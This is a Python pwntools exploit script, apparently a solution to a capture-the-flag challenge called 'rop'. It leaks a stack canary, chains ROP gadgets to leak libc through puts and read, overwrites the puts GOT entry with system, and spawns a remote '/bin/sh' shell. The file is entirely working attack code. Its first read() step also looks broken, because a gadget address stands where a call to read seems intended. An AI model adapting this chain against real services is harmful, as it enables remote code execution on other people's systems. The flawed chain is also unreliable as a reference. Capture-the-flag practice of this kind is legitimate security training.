from pwn import *

#p = process('./rop')
p = remote('127.0.0.1', '7182')
#p = remote('host3.dreamhack.games', '21835')
e = ELF('./rop')
libc = ELF('./libc.so.6')

ret = 0x400596 # ROPgadget --binary rop | grep 'ret'
pop_rdi_ret = 0x400853 # ROPgadget --binary rop | grep 'pop rdi'
pop_rsi_r15 = 0x400851

buf = b"A"*0x39
p.sendafter(b"Buf:", buf)
p.recvuntil(buf)
canary = u64(b'\x00' + p.recv(7))
print(hex(canary))

payload = b"A"*0x38 + p64(canary) + b"A"*0x8

main_address = e.symbols['main']
puts_plt = e.plt['puts']
puts_got = e.got['puts']
read_plt = e.plt['read']
read_got = e.got['read']

bss = e.bss() # bss에 /bin/sh 적어주기
# puts(read_got)
payload += p64(pop_rdi_ret)
payload += p64(read_got)
payload += p64(puts_plt) 
# read(0, '/bin/sh', bss)
payload += p64(pop_rdi_ret)
payload += p64(0)
payload += p64(pop_rsi_r15)
payload += p64(bss)
payload += p64(0) 
payload += p64(pop_rdi_ret)
# read(0, system, puts_got)
payload += p64(pop_rdi_ret)
payload += p64(0)       
payload += p64(pop_rsi_r15)
payload += p64(puts_got)
payload += p64(0)
payload += p64(read_plt)
# puts('/bin/sh') -> system('/bin/sh')
payload += p64(pop_rdi_ret)
payload += p64(bss)
payload += p64(puts_plt)

p.sendafter(b"Buf: ", payload)
read_add = u64(p.recvuntil(f'\x7f').ljust(8, b'\x00'))
libc_base = read_add - libc.sym['read']
system = libc_base + libc.sym['system']

p.send(b'/bin/sh\x00')
p.send(p64(system))
p.interactive()